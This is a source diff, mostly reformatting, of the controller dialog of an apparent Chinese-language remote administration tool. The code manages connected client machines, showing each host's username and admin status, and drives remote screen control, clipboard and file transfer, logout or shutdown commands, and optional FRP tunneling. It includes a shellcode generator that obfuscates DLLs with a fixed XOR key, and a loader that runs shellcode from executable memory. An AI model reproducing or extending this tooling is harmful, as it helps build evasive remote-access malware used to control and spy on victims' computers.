@@ -970,7 +970,7 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
     AUTO_TICK(500);
     CDialogEx::OnInitDialog();
     int ret = InitFileUpload(GetHMAC());
-	g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, AfxGetInstanceHandle(), 0);
+    g_hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, AfxGetInstanceHandle(), 0);
 
     m_GroupList = {"default"};
     // Grid 容器
@@ -1133,11 +1133,13 @@ DWORD WINAPI CMy2015RemoteDlg::StartFrpClient(LPVOID param)
     int usingFRP = 0;
 #ifdef _WIN64
     usingFRP = ip.empty() ? 0 : THIS_CFG.GetInt("frp", "UseFrp");
+#else
+    CloseHandle(This->m_hFRPThread);
+    This->m_hFRPThread = NULL;
+    return 0x20250820;
 #endif
-    if (!usingFRP) {
-        CloseHandle(This->m_hFRPThread);
-        This->m_hFRPThread = NULL;
-        return 0x20250820;
+    if (usingFRP) {
+        This->m_frpStatus = STATUS_RUN;
     }
 
     Mprintf("[FRP] Proxy thread start running\n");
@@ -2056,25 +2058,29 @@ std::string getDateStr(int daysOffset = 0)
     return oss.str();
 }
 
-bool SendData(void* user, FileChunkPacket* chunk, BYTE* data, int size) {
-	CONTEXT_OBJECT* ctx = (CONTEXT_OBJECT*)user;
-	if (!ctx->Send2Client(data, size)) {
-		return false;
-	}
-	return true;
+bool SendData(void* user, FileChunkPacket* chunk, BYTE* data, int size)
+{
+    CONTEXT_OBJECT* ctx = (CONTEXT_OBJECT*)user;
+    if (!ctx->Send2Client(data, size)) {
+        return false;
+    }
+    return true;
 }
 
-void RecvData(void* ptr) {
+void RecvData(void* ptr)
+{
     FileChunkPacket* pkt = (FileChunkPacket*)ptr;
 }
 
-void delay_cancel(CONTEXT_OBJECT* ctx, int sec) {
-	if (!ctx) return;
+void delay_cancel(CONTEXT_OBJECT* ctx, int sec)
+{
+    if (!ctx) return;
     Sleep(sec*1000);
-	ctx->CancelIO();
+    ctx->CancelIO();
 }
 
-void FinishSend(void* user) {
+void FinishSend(void* user)
+{
     CONTEXT_OBJECT* ctx = (CONTEXT_OBJECT*)user;
     // 需要等待客户端接收完成方可关闭
     std::thread(delay_cancel, ctx, 15).detach();
@@ -2092,28 +2098,28 @@ VOID CMy2015RemoteDlg::MessageHandle(CONTEXT_OBJECT* ContextObject)
     // 【L】：主机上下线和授权
     // 【x】：对话框相关功能
     switch (cmd) {
-	case COMMAND_GET_FILE: {
-		// 发送文件
-		auto files = GetClipboardFiles();
-		if (!files.empty()) {
-			std::string dir = (char*)(szBuffer + 1);
+    case COMMAND_GET_FILE: {
+        // 发送文件
+        auto files = GetClipboardFiles();
+        if (!files.empty()) {
+            std::string dir = (char*)(szBuffer + 1);
             std::string hash = GetPwdHash(), hmac = GetHMAC(100);
-			std::thread(FileBatchTransferWorker, files, dir, ContextObject, SendData, FinishSend,
-                hash, hmac).detach();
-		}
-		break;
-	}
-	case COMMAND_SEND_FILE: {
-		// 接收文件
-		std::string hash = GetPwdHash(), hmac = GetHMAC(100);
+            std::thread(FileBatchTransferWorker, files, dir, ContextObject, SendData, FinishSend,
+                        hash, hmac).detach();
+        }
+        break;
+    }
+    case COMMAND_SEND_FILE: {
+        // 接收文件
+        std::string hash = GetPwdHash(), hmac = GetHMAC(100);
         CONNECT_ADDRESS addr;
         memcpy(addr.pwdHash, hash.c_str(), min(hash.length(), sizeof(addr.pwdHash)));
-		int n = RecvFileChunk((char*)szBuffer, len, &addr, RecvData, hash, hmac);
-		if (n) {
-			Mprintf("RecvFileChunk failed: %d. hash: %s, hmac: %s\n", n, hash.c_str(), hmac.c_str());
-		}
-		break;
-	}
+        int n = RecvFileChunk((char*)szBuffer, len, &addr, RecvData, hash, hmac);
+        if (n) {
+            Mprintf("RecvFileChunk failed: %d. hash: %s, hmac: %s\n", n, hash.c_str(), hmac.c_str());
+        }
+        break;
+    }
     case TOKEN_GETVERSION: { // 获取版本【L】
         // TODO 维持心跳
         bool is64Bit = ContextObject->InDeCompressedBuffer.GetBYTE(1);
@@ -2433,7 +2439,8 @@ void CMy2015RemoteDlg::SendMasterSettings(CONTEXT_OBJECT* ctx)
     }
 }
 
-bool isAllZeros(const BYTE* data, int len) {
+bool isAllZeros(const BYTE* data, int len)
+{
     for (int i = 0; i < len; ++i)
         if (data[i])
             return false;
@@ -3056,7 +3063,7 @@ void CMy2015RemoteDlg::OnListClick(NMHDR* pNMHDR, LRESULT* pResult)
         strText.Format(_T("文件路径: %s%s %s\r\n系统信息: %s 位 %s 核心 %s GB\r\n启动信息: %s %s %s%s\r\n上线信息: %s %d %s"),
                        res[RES_PROGRAM_BITS].IsEmpty() ? "" : res[RES_PROGRAM_BITS] + " 位 ", res[RES_FILE_PATH], res[RES_EXE_VERSION],
                        res[RES_SYSTEM_BITS], res[RES_SYSTEM_CPU], res[RES_SYSTEM_MEM], startTime, expired.c_str(),
-			           res[RES_USERNAME], res[RES_ISADMIN] == "1" ? "[管理员]" : res[RES_ISADMIN].IsEmpty() ? "" : "[非管理员]",
+                       res[RES_USERNAME], res[RES_ISADMIN] == "1" ? "[管理员]" : res[RES_ISADMIN].IsEmpty() ? "" : "[非管理员]",
                        ctx->GetProtocol().c_str(), ctx->GetServerPort(), typMap[type].c_str());
 
         // 获取鼠标位置
@@ -3157,14 +3164,14 @@ void CMy2015RemoteDlg::OnToolInputPassword()
     }
 }
 
-bool safe_exec(void *exec) {
-	__try {
-		((void(*)())exec)();
+bool safe_exec(void *exec)
+{
+    __try {
+        ((void(*)())exec)();
         return true;
-	}
-	__except (EXCEPTION_EXECUTE_HANDLER) {
-		VirtualFree(exec, 0, MEM_RELEASE);
-	}
+    } __except (EXCEPTION_EXECUTE_HANDLER) {
+        VirtualFree(exec, 0, MEM_RELEASE);
+    }
     return false;
 }
 
@@ -3184,60 +3191,58 @@ int main() {
 }
 */
 #include "common/obfs.h"
-void shellcode_process(ObfsBase *obfs, bool load = false, const char* suffix = ".c") {
-	CFileDialog fileDlg(TRUE, NULL, NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
-		_T("DLL Files (*.dll)|*.dll|BIN Files (*.bin)|*.bin|All Files (*.*)|*.*||"), AfxGetMainWnd());
-	int ret = 0;
-	try {
-		ret = fileDlg.DoModal();
-	}
-	catch (...) {
-		AfxMessageBox("文件对话框未成功打开! 请稍后再试。", MB_ICONWARNING);
-		return;
-	}
-	if (ret == IDOK) {
-		CString name = fileDlg.GetPathName();
-		CFile File;
-		BOOL r = File.Open(name, CFile::typeBinary | CFile::modeRead);
-		if (!r) {
-			AfxMessageBox("文件打开失败! 请稍后再试。\r\n" + name, MB_ICONWARNING);
-			return;
-		}
-		int dwFileSize = File.GetLength();
-		LPBYTE szBuffer = new BYTE[dwFileSize];
-		File.Read(szBuffer, dwFileSize);
-		File.Close();
+void shellcode_process(ObfsBase *obfs, bool load = false, const char* suffix = ".c")
+{
+    CFileDialog fileDlg(TRUE, NULL, NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,
+                        _T("DLL Files (*.dll)|*.dll|BIN Files (*.bin)|*.bin|All Files (*.*)|*.*||"), AfxGetMainWnd());
+    int ret = 0;
+    try {
+        ret = fileDlg.DoModal();
+    } catch (...) {
+        AfxMessageBox("文件对话框未成功打开! 请稍后再试。", MB_ICONWARNING);
+        return;
+    }
+    if (ret == IDOK) {
+        CString name = fileDlg.GetPathName();
+        CFile File;
+        BOOL r = File.Open(name, CFile::typeBinary | CFile::modeRead);
+        if (!r) {
+            AfxMessageBox("文件打开失败! 请稍后再试。\r\n" + name, MB_ICONWARNING);
+            return;
+        }
+        int dwFileSize = File.GetLength();
+        LPBYTE szBuffer = new BYTE[dwFileSize];
+        File.Read(szBuffer, dwFileSize);
+        File.Close();
 
-		LPBYTE srcData = NULL;
-		int srcLen = 0;
-        if (load){
+        LPBYTE srcData = NULL;
+        int srcLen = 0;
+        if (load) {
             const uint32_t key = 0xDEADBEEF;
             obfs->DeobfuscateBuffer(szBuffer, dwFileSize, key);
-			void* exec = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-			if (exec) {
-				memcpy(exec, szBuffer, dwFileSize);
-				if (safe_exec(exec)) {
-					AfxMessageBox("Shellcode 执行成功! ", MB_ICONINFORMATION);
-                }
-                else {
+            void* exec = VirtualAlloc(NULL, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            if (exec) {
+                memcpy(exec, szBuffer, dwFileSize);
+                if (safe_exec(exec)) {
+                    AfxMessageBox("Shellcode 执行成功! ", MB_ICONINFORMATION);
+                } else {
                     AfxMessageBox("Shellcode 执行失败! 请用本程序生成的 bin 文件进行测试! ", MB_ICONERROR);
                 }
-			}
-        }
-		else if (MakeShellcode(srcData, srcLen, (LPBYTE)szBuffer, dwFileSize)) {
-			TCHAR buffer[MAX_PATH];
-			_tcscpy_s(buffer, name);
-			PathRemoveExtension(buffer);
+            }
+        } else if (MakeShellcode(srcData, srcLen, (LPBYTE)szBuffer, dwFileSize)) {
+            TCHAR buffer[MAX_PATH];
+            _tcscpy_s(buffer, name);
+            PathRemoveExtension(buffer);
             const uint32_t key = 0xDEADBEEF;
             obfs->ObfuscateBuffer(srcData, srcLen, key);
-			if (obfs->WriteFile(CString(buffer) + suffix, srcData, srcLen, "Shellcode")) {
-				AfxMessageBox("Shellcode 生成成功! 请自行编写调用程序。\r\n" + CString(buffer) + suffix,
-					MB_ICONINFORMATION);
-			}
-		}
-		SAFE_DELETE_ARRAY(srcData);
-		SAFE_DELETE_ARRAY(szBuffer);
-	}
+            if (obfs->WriteFile(CString(buffer) + suffix, srcData, srcLen, "Shellcode")) {
+                AfxMessageBox("Shellcode 生成成功! 请自行编写调用程序。\r\n" + CString(buffer) + suffix,
+                              MB_ICONINFORMATION);
+            }
+        }
+        SAFE_DELETE_ARRAY(srcData);
+        SAFE_DELETE_ARRAY(szBuffer);
+    }
 }
 
 void CMy2015RemoteDlg::OnToolGenShellcode()
@@ -3255,36 +3260,36 @@ void CMy2015RemoteDlg::OnObfsShellcode()
 
 void CMy2015RemoteDlg::OnToolGenShellcodeBin()
 {
-	ObfsBase obfs(false);
-	shellcode_process(&obfs, false, ".bin");
+    ObfsBase obfs(false);
+    shellcode_process(&obfs, false, ".bin");
 }
 
 void CMy2015RemoteDlg::OnObfsShellcodeBin()
 {
-	Obfs obfs(false);
-	shellcode_process(&obfs, false,  ".bin");
+    Obfs obfs(false);
+    shellcode_process(&obfs, false,  ".bin");
 }
 
 
 void CMy2015RemoteDlg::OnShellcodeLoadTest()
 {
     if (MessageBox(CString("是否测试 ") + (sizeof(void*) == 8 ? "64位" : "32位") + " Shellcode 二进制文件? "
-        "请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。", 
-        "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
-		ObfsBase obfs;
-		shellcode_process(&obfs, true);
+                           "请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。",
+                           "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
+        ObfsBase obfs;
+        shellcode_process(&obfs, true);
     }
 }
 
 
 void CMy2015RemoteDlg::OnShellcodeObfsLoadTest()
 {
-	if (MessageBox(CString("是否测试 ") + (sizeof(void*) == 8 ? "64位" : "32位") + " Shellcode 二进制文件? "
-        "请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。",
-		"提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
-		Obfs obfs;
-		shellcode_process(&obfs, true);
-	}
+    if (MessageBox(CString("是否测试 ") + (sizeof(void*) == 8 ? "64位" : "32位") + " Shellcode 二进制文件? "
+                           "请选择受信任的 bin 文件。\r\n测试未知来源的 Shellcode 可能导致程序崩溃，甚至存在 CC 风险。",
+                           "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
+        Obfs obfs;
+        shellcode_process(&obfs, true);
+    }
 }
 
 void CMy2015RemoteDlg::OnOnlineAssignTo()
@@ -3504,18 +3509,19 @@ void CMy2015RemoteDlg::OnOnlineRegroup()
 }
 
 
-void CMy2015RemoteDlg::MachineManage(MachineCommand type) {
-	if (MessageBoxA("此操作需客户端具有管理员权限，确定继续吗? ", "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
-		EnterCriticalSection(&m_cs);
-		POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
-		while (Pos) {
-			int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
-			context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
+void CMy2015RemoteDlg::MachineManage(MachineCommand type)
+{
+    if (MessageBoxA("此操作需客户端具有管理员权限，确定继续吗? ", "提示", MB_ICONQUESTION | MB_YESNO) == IDYES) {
+        EnterCriticalSection(&m_cs);
+        POSITION Pos = m_CList_Online.GetFirstSelectedItemPosition();
+        while (Pos) {
+            int	iItem = m_CList_Online.GetNextSelectedItem(Pos);
+            context* ContextObject = (context*)m_CList_Online.GetItemData(iItem);
             BYTE token[32] = { TOKEN_MACHINE_MANAGE, type };
-			ContextObject->Send2Client(token, sizeof(token));
-		}
-		LeaveCriticalSection(&m_cs);
-	}
+            ContextObject->Send2Client(token, sizeof(token));
+        }
+        LeaveCriticalSection(&m_cs);
+    }
 }
 
 void CMy2015RemoteDlg::OnMachineLogout()
@@ -3550,73 +3556,76 @@ void CMy2015RemoteDlg::OnExecuteUpload()
 
 void CMy2015RemoteDlg::OnDestroy()
 {
-	if (g_hKeyboardHook)
-	{
-		UnhookWindowsHookEx(g_hKeyboardHook);
-		g_hKeyboardHook = NULL;
-	}
+    if (g_hKeyboardHook) {
+        UnhookWindowsHookEx(g_hKeyboardHook);
+        g_hKeyboardHook = NULL;
+    }
     CDialogEx::OnDestroy();
 }
 
 CString GetClipboardText()
 {
-	if (!OpenClipboard(nullptr)) return _T("");
+    if (!OpenClipboard(nullptr)) return _T("");
 
 #ifdef UNICODE
-	HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
 #else
-	HANDLE hData = GetClipboardData(CF_TEXT);
+    HANDLE hData = GetClipboardData(CF_TEXT);
 #endif
 
-	if (!hData) { CloseClipboard(); return _T(""); }
+    if (!hData) {
+        CloseClipboard();
+        return _T("");
+    }
 
 #ifdef UNICODE
-	wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
+    wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
 #else
-	char* pszText = static_cast<char*>(GlobalLock(hData));
+    char* pszText = static_cast<char*>(GlobalLock(hData));
 #endif
 
-	CString strText = pszText ? pszText : _T("");
-	GlobalUnlock(hData);
-	CloseClipboard();
-	return strText;
+    CString strText = pszText ? pszText : _T("");
+    GlobalUnlock(hData);
+    CloseClipboard();
+    return strText;
 }
 
 void SetClipboardText(const CString& text)
 {
-	if (!OpenClipboard(nullptr)) return;
-	EmptyClipboard();
+    if (!OpenClipboard(nullptr)) return;
+    EmptyClipboard();
 
 #ifdef UNICODE
-	HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, (text.GetLength() + 1) * sizeof(wchar_t));
-	wchar_t* p = static_cast<wchar_t*>(GlobalLock(hGlob));
-	if (p) wcscpy_s(p, text.GetLength() + 1, text);
+    HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, (text.GetLength() + 1) * sizeof(wchar_t));
+    wchar_t* p = static_cast<wchar_t*>(GlobalLock(hGlob));
+    if (p) wcscpy_s(p, text.GetLength() + 1, text);
 #else
-	HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, (text.GetLength() + 1) * sizeof(char));
-	char* p = static_cast<char*>(GlobalLock(hGlob));
-	if (p) strcpy_s(p, text.GetLength() + 1, CT2A(text)); // CT2A 宏把 CString 转成 char*
+    HGLOBAL hGlob = GlobalAlloc(GMEM_MOVEABLE, (text.GetLength() + 1) * sizeof(char));
+    char* p = static_cast<char*>(GlobalLock(hGlob));
+    if (p) strcpy_s(p, text.GetLength() + 1, CT2A(text)); // CT2A 宏把 CString 转成 char*
 #endif
 
-	GlobalUnlock(hGlob);
+    GlobalUnlock(hGlob);
 #ifdef UNICODE
-	SetClipboardData(CF_UNICODETEXT, hGlob);
+    SetClipboardData(CF_UNICODETEXT, hGlob);
 #else
-	SetClipboardData(CF_TEXT, hGlob);
+    SetClipboardData(CF_TEXT, hGlob);
 #endif
-	CloseClipboard();
+    CloseClipboard();
 }
 
 CDialogBase* CMy2015RemoteDlg::GetRemoteWindow(HWND hWnd)
 {
-	if (!::IsWindow(hWnd)) return FALSE;
+    if (!::IsWindow(hWnd)) return FALSE;
     EnterCriticalSection(&m_cs);
     auto find = m_RemoteWnds.find(hWnd);
-	auto ret = find == m_RemoteWnds.end() ? NULL : find->second;
+    auto ret = find == m_RemoteWnds.end() ? NULL : find->second;
     LeaveCriticalSection(&m_cs);
     return ret;
 }
 
-void CMy2015RemoteDlg::RemoveRemoteWindow(HWND wnd) {
+void CMy2015RemoteDlg::RemoveRemoteWindow(HWND wnd)
+{
     EnterCriticalSection(&m_cs);
     m_RemoteWnds.erase(wnd);
     LeaveCriticalSection(&m_cs);
@@ -3624,48 +3633,41 @@ void CMy2015RemoteDlg::RemoveRemoteWindow(HWND wnd) {
 
 LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	if (nCode == HC_ACTION)
-	{
+    if (nCode == HC_ACTION) {
         do {
             static CDialogBase* operateWnd = nullptr;
             KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;
 
             // 只在按下时处理
-            if (wParam == WM_KEYDOWN)
-            {
+            if (wParam == WM_KEYDOWN) {
                 // 检测 Ctrl+C / Ctrl+X
                 if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (pKey->vkCode == 'C' || pKey->vkCode == 'X')) {
                     HWND hFore = ::GetForegroundWindow();
                     operateWnd = g_2015RemoteDlg->GetRemoteWindow(hFore);
-                    if (!operateWnd) 
+                    if (!operateWnd)
                         g_2015RemoteDlg->m_pActiveSession = nullptr;
                 }
                 // 检测 Ctrl+V
-                else if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && pKey->vkCode == 'V')
-                {
+                else if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && pKey->vkCode == 'V') {
                     HWND hFore = ::GetForegroundWindow();
                     CDialogBase* dlg = g_2015RemoteDlg->GetRemoteWindow(hFore);
-                    if (dlg)
-                    {
+                    if (dlg) {
                         if (dlg == operateWnd)break;
-						auto screen = (CScreenSpyDlg*)dlg;
+                        auto screen = (CScreenSpyDlg*)dlg;
                         if (!screen->m_bIsCtrl) {
                             Mprintf("【Ctrl+V】 [本地 -> 远程] 窗口不是控制状态: %s\n", screen->m_IPAddress);
                             break;
                         }
                         // [1] 本地 -> 远程
-						auto files = GetClipboardFiles();
-						if (!files.empty())
-						{
+                        auto files = GetClipboardFiles();
+                        if (!files.empty()) {
                             // 获取远程目录
                             BYTE szBuffer[100] = { COMMAND_GET_FOLDER };
-							std::string masterId = GetPwdHash(), hmac = GetHMAC(100);
-							memcpy((char*)szBuffer + 1, masterId.c_str(), masterId.length());
-							memcpy((char*)szBuffer + 1 + masterId.length(), hmac.c_str(), hmac.length());
-							dlg->m_ContextObject->Send2Client(szBuffer, sizeof(szBuffer));
-						}
-                        else
-                        {
+                            std::string masterId = GetPwdHash(), hmac = GetHMAC(100);
+                            memcpy((char*)szBuffer + 1, masterId.c_str(), masterId.length());
+                            memcpy((char*)szBuffer + 1 + masterId.length(), hmac.c_str(), hmac.length());
+                            dlg->m_ContextObject->Send2Client(szBuffer, sizeof(szBuffer));
+                        } else {
                             CString strText = GetClipboardText();
                             if (!strText.IsEmpty()) {
                                 BYTE* szBuffer = new BYTE[strText.GetLength() + 1];
@@ -3676,9 +3678,7 @@ LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam
                                 SAFE_DELETE_ARRAY(szBuffer);
                             }
                         }
-                    }
-                    else if (g_2015RemoteDlg->m_pActiveSession && operateWnd)
-                    {
+                    } else if (g_2015RemoteDlg->m_pActiveSession && operateWnd) {
                         auto screen = (CScreenSpyDlg*)(g_2015RemoteDlg->m_pActiveSession);
                         if (!screen->m_bIsCtrl) {
                             Mprintf("【Ctrl+V】 [远程 -> 本地] 窗口不是控制状态: %s\n", screen->m_IPAddress);
@@ -3687,35 +3687,32 @@ LRESULT CALLBACK CMy2015RemoteDlg::LowLevelKeyboardProc(int nCode, WPARAM wParam
                         // [2] 远程 -> 本地
                         BYTE	bToken[100] = {COMMAND_SCREEN_GET_CLIPBOARD};
                         std::string masterId = GetPwdHash(), hmac = GetHMAC(100);
-						memcpy((char*)bToken + 1, masterId.c_str(), masterId.length());
-						memcpy((char*)bToken + 1 + masterId.length(), hmac.c_str(), hmac.length());
-						auto files = GetClipboardFiles();
-						if (!files.empty()) {
-							if (::OpenClipboard(nullptr))
-							{
-								EmptyClipboard();
-								CloseClipboard();
-							}
-						}
+                        memcpy((char*)bToken + 1, masterId.c_str(), masterId.length());
+                        memcpy((char*)bToken + 1 + masterId.length(), hmac.c_str(), hmac.length());
+                        auto files = GetClipboardFiles();
+                        if (!files.empty()) {
+                            if (::OpenClipboard(nullptr)) {
+                                EmptyClipboard();
+                                CloseClipboard();
+                            }
+                        }
                         g_2015RemoteDlg->m_pActiveSession->m_ContextObject->Send2Client(bToken, sizeof(bToken));
                         Mprintf("【Ctrl+V】 从远程拷贝到本地 \n");
-                    }
-                    else
-                    {
+                    } else {
                         Mprintf("[Ctrl+V] 没有活动的远程桌面会话 \n");
                     }
                 }
             }
         } while (0);
-	}
+    }
 
-	// 允许消息继续传递
-	return CallNextHookEx(g_2015RemoteDlg->g_hKeyboardHook, nCode, wParam, lParam);
+    // 允许消息继续传递
+    return CallNextHookEx(g_2015RemoteDlg->g_hKeyboardHook, nCode, wParam, lParam);
 }
 
 LRESULT CMy2015RemoteDlg::OnSessionActivatedMsg(WPARAM wParam, LPARAM lParam)
 {
-	CDialogBase* pSession = reinterpret_cast<CDialogBase*>(wParam);
+    CDialogBase* pSession = reinterpret_cast<CDialogBase*>(wParam);
     m_pActiveSession = pSession;
-	return 0;
+    return 0;
 }
